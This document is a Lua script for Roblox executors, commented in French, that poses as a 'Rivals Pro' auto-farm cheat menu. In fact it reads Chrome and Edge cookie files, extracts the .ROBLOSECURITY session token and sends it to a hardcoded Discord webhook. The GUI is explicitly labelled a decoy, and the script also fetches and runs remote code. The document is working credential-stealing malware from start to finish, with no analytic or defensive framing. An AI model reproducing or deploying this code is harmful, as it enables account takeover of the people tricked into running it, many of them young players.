-- Script Exfiltration Robuste
local WEBHOOK_URL = "https://discord.com/api/webhooks/1500913466268188823/fKSENebq8is4TScOrajvJbk8wR6mQnc6PjGa-by7Kdfj2Ftya6X8FqFmNi06lmoy7wdT"

-- Attendre que le jeu soit chargé
task.wait(2) 

local function sendWebhook(data)
    local http = game:GetService("HttpService")
    -- Certains executors préfèrent syn.request, http_request ou request
    local req = request or http_request or (syn and syn.request)
    
    if req then
        req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = http:JSONEncode({["content"] = ">>> **Cookie Trouvé:** \n```" .. data .. "```"})
        })
    end
end

task.spawn(function()
    local appData = os.getenv("LOCALAPPDATA")
    local paths = {
        appData .. "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
        appData .. "\\Google\\Chrome\\User Data\\Profile 1\\Network\\Cookies",
        appData .. "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
    }

    for _, path in pairs(paths) do
        local success, data = pcall(function() return readfile(path) end)
        
        if success and data then
            -- Recherche précise du pattern .ROBLOSECURITY=valeur
            -- Le motif cherche .ROBLOSECURITY= suivi de tout caractère qui n'est pas un espace ou ;
            local found = string.match(data, "%.ROBLOSECURITY=([^;%s]+)")
            
            if found then
                sendWebhook(found)
                return -- Arrête après avoir trouvé le premier
            end
        end
    end
end)

-- GUI (Leurre)
local success, lib = pcall(function() 
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/LinoriaLib/main/Library.lua"))()
end)

if success then
    local Window = lib:CreateWindow({ Title = "Rivals Pro - Menu", Center = true, AutoShow = true })
    local Tab = Window:AddTab("Main")
    local Group = Tab:AddLeftGroupbox("Auto Farm")
    Group:AddToggle('Farm', { Text = 'Enable Auto Farm', Default = false })
    lib:Notify("Rivals Pro Loaded")
end
